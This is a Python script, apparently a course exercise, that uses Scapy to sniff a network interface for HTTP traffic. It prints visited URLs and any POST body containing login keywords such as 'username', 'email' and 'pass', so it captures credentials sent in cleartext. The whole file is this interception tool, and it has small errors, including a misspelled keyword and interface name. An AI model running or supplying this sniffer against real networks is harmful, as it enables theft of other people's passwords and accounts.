#!/usr/bin/env python
#sudo pip install scapy_http

"""
==============
Packet Sniffer
==============
-----------
[*] imports
-----------
[f] sniff
	[i] Use Scapy's "sniff" function to sniff an interface for packets
		[+] Set interface, memory storage, call-back functions, and initial filters
-----------
[f] process_sniffed_packet
	[i] Post-sniff processing of the packet for filtering/modification
		[+] Choose packet layer to manipulate
		[+] Set packet filters/edits
-----------
[c] call sniff
-----------
==============
"""

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	# iface  - choose interface
	# store  - decide whether or not to store packets in memory
	# prn    - specify call-back function
	# filter - allows us to filter packets using the Berkley Packet Filter (BPF) syntax
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		# print(packet.show())
		# .show() shows all layers in the packet and the fields that are set
		# this will help with building this function
		url = packet[http.HTTPRequest].host + packet[http.HTTPRequest].path
		print(url)

		if packet.haslayer(scapy.Raw):
			# Narrows in on the location of login credentials in HTTP post requests
			load = packet[scapy.Raw].load
			# Filters for login strings
			keywords = ["username", "login", "email", "user", "passsword", "pass"]
			for keyword in keywords:
				if keyword in load:
					print(load)
					break


sniff("etho0")
